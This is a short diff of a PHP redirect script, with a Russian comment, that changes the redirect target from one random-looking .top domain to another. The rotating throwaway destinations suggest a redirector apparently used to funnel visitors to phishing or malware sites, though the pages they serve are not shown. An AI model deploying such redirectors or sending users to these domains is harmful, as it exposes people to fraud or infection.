@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serversolantor.top/54DfD9');
+header('Location: https://aaavornix.top/LTRz1Z');
 exit();
 ?>
